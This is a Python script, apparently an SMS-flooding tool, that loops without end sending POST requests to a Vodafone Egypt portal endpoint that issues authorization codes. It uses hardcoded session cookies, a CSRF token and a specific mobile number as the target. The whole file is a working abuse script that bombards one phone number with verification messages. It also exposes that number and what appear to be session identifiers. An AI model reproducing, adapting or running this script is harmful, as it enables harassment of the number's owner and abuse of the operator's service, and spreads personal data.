import requests

while True:
    cookies = {
        'JSESSIONID': '598263F7C21B2053FE63911831D90669',
        'TS01e46328': '0150f551afc42e847ef15c653acf45d86a643a2a3c489049d0440fedd8f6cf7ae4076b878a6e2e2f3e3c707219c46e48762978bd68eed463dc7a7320afdacbcf25d740940126ae6efd0a11fa7bcc4bcddc587e8964',
        '_lfa': 'LF1.1.1d693bb4b423cc94.1691528770217',
        'ROUTEID': '.node1',
        'dtCookie': 'v_4_srv_5_sn_66F468858CECCE98629D2327856ADBA3_perc_100000_ol_0_mul_1_app-3A769ebd1eb3b76477_1_app-3Aa294637573749774_0',
        'AMCVS_C6AA02BE532E6B0F0A490D4C%40AdobeOrg': '1',
        'AMCV_C6AA02BE532E6B0F0A490D4C%40AdobeOrg': '-1124106680%7CMCIDTS%7C19578%7CMCMID%7C83492737686519322132577628736860367455%7CMCAAMLH-1692133615%7C6%7CMCAAMB-1692133615%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1691536015s%7CNONE%7CvVersion%7C5.2.0',
        's_cc': 'true',
        '_gid': 'GA1.3.145463798.1691528818',
        '_ga': 'GA1.1.1302118346.1691528818',
        '_ga_26LZ0HK0KL': 'GS1.1.1691528818.1.0.1691528819.0.0.0',
        '_ga_29DGDE2ZSQ': 'GS1.1.1691528819.1.0.1691528819.60.0.0',
        'rxVisitor': '1691528820131NF5UCTRCN8SR8O0MUT2BLVM0VJH93ON2',
        'CONSENTMGR': 'c1:0%7Cc2:0%7Cc3:0%7Cc4:0%7Cc5:0%7Cc6:0%7Cc7:0%7Cc8:0%7Cc9:0%7Cc10:0%7Cc11:1%7Cc12:0%7Cc13:0%7Cc14:0%7Cc15:0%7Cts:1691528823395%7Cconsent:true',
        'TS01d334b6026': '01a324dbbb691f72879e7e2bbcdcff7a2bea285009c3845a782f8c9948ee48c1e1dcdd7d6802d3c905ae677677f23f32590bdac8724db85d87ec8b9b043be621725b8351b1',
        'dtSa': '-',
        'TS01d334b6': '0150f551af1a70d8a050046de4a52a9128dd0d8e96103f9bcaaed82b4332d3c6d9a8709ba3d3efbbcbd45028c011a623f020f5c0eda58cce1a9b360644f5426a1929aaaf5fe15c3efe0f38aa68e3565ef0b7f13718',
        'utag_main': 'v_id:0189d6f98254002f83de3e408db80506f003a067008d8$_sn:3$_se:1$_ss:1$_st:1691537772040$ses_id:1691535972040%3Bexp-session$_pn:1%3Bexp-session',
        'OptanonConsent': 'isIABGlobal=false&datestamp=Wed+Aug+09+2023+01%3A06%3A12+GMT%2B0200+(%D8%BA%D8%B1%D9%8A%D9%86%D8%AA%D8%B4%2B02%3A00)&version=202210.1.0&hosts=&consentId=9459df15-fb63-46c1-bd65-a1b0c42bc904&interactionCount=1&landingPath=NotLandingPage&groups=&AwaitingReconsent=false&geolocation=%3B',
        'OptanonAlertBoxClosed': '2023-08-08T23:06:12.128Z',
        'rxvt': '1691537772161|1691535971215',
        'dtPC': '5$135971207_626h-vUTVNSCMMTFGGQFSOCRSDCPUFQADHFWJF-0e0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'JSESSIONID=598263F7C21B2053FE63911831D90669; TS01e46328=0150f551afc42e847ef15c653acf45d86a643a2a3c489049d0440fedd8f6cf7ae4076b878a6e2e2f3e3c707219c46e48762978bd68eed463dc7a7320afdacbcf25d740940126ae6efd0a11fa7bcc4bcddc587e8964; _lfa=LF1.1.1d693bb4b423cc94.1691528770217; ROUTEID=.node1; dtCookie=v_4_srv_5_sn_66F468858CECCE98629D2327856ADBA3_perc_100000_ol_0_mul_1_app-3A769ebd1eb3b76477_1_app-3Aa294637573749774_0; AMCVS_C6AA02BE532E6B0F0A490D4C%40AdobeOrg=1; AMCV_C6AA02BE532E6B0F0A490D4C%40AdobeOrg=-1124106680%7CMCIDTS%7C19578%7CMCMID%7C83492737686519322132577628736860367455%7CMCAAMLH-1692133615%7C6%7CMCAAMB-1692133615%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1691536015s%7CNONE%7CvVersion%7C5.2.0; s_cc=true; _gid=GA1.3.145463798.1691528818; _ga=GA1.1.1302118346.1691528818; _ga_26LZ0HK0KL=GS1.1.1691528818.1.0.1691528819.0.0.0; _ga_29DGDE2ZSQ=GS1.1.1691528819.1.0.1691528819.60.0.0; rxVisitor=1691528820131NF5UCTRCN8SR8O0MUT2BLVM0VJH93ON2; CONSENTMGR=c1:0%7Cc2:0%7Cc3:0%7Cc4:0%7Cc5:0%7Cc6:0%7Cc7:0%7Cc8:0%7Cc9:0%7Cc10:0%7Cc11:1%7Cc12:0%7Cc13:0%7Cc14:0%7Cc15:0%7Cts:1691528823395%7Cconsent:true; TS01d334b6026=01a324dbbb691f72879e7e2bbcdcff7a2bea285009c3845a782f8c9948ee48c1e1dcdd7d6802d3c905ae677677f23f32590bdac8724db85d87ec8b9b043be621725b8351b1; dtSa=-; TS01d334b6=0150f551af1a70d8a050046de4a52a9128dd0d8e96103f9bcaaed82b4332d3c6d9a8709ba3d3efbbcbd45028c011a623f020f5c0eda58cce1a9b360644f5426a1929aaaf5fe15c3efe0f38aa68e3565ef0b7f13718; utag_main=v_id:0189d6f98254002f83de3e408db80506f003a067008d8$_sn:3$_se:1$_ss:1$_st:1691537772040$ses_id:1691535972040%3Bexp-session$_pn:1%3Bexp-session; OptanonConsent=isIABGlobal=false&datestamp=Wed+Aug+09+2023+01%3A06%3A12+GMT%2B0200+(%D8%BA%D8%B1%D9%8A%D9%86%D8%AA%D8%B4%2B02%3A00)&version=202210.1.0&hosts=&consentId=9459df15-fb63-46c1-bd65-a1b0c42bc904&interactionCount=1&landingPath=NotLandingPage&groups=&AwaitingReconsent=false&geolocation=%3B; OptanonAlertBoxClosed=2023-08-08T23:06:12.128Z; rxvt=1691537772161|1691535971215; dtPC=5$135971207_626h-vUTVNSCMMTFGGQFSOCRSDCPUFQADHFWJF-0e0',
        'Origin': 'https://vhub.vodafone.com.eg',
        'Referer': 'https://vhub.vodafone.com.eg/portal/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobileNumber': '01005819057',
        'CSRFToken': '1fcdba56-dc2b-49d0-b288-3d896c67b306',
    }

    response = requests.post(
        'https://vhub.vodafone.com.eg/portal/register/sendAuthorizationCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )
